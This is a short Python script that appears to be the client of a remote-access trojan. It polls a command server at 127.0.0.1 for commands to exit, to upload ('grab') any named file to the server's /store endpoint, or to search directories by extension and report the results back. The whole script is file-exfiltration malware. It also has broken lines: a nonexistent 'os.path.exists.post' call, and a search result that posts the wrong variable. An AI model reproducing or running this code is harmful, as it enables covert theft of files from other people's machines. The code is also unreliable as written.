import requests
import os
import time
from subprocess import PIPE, Popen

SERVER_URL = 'http://127.0.0.1'

while True:
    req = requests.get(SERVER_URL)
    command = req.text

    if 'terminate' in command:
        break
    elif 'grab' in command:
        grab,path = command.split('*')
        if os.path.exists.post(path):
            url = SERVER_URL + '/store'
            files = {'file':open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url=SERVER_URL, data='[-] Not able to find the file !')
    elif 'search' in command:
        command = command[7:]
        path,ext = command.split('*')
        ls = ''
        for dirpath, dirname, files in os.walk(path):
            for f in files:
                if f.endswith(ext):
                    ls = ls + '\n' + os.path.join(dirpath, f)
        requests.post(url=SERVER_URL, data=list)
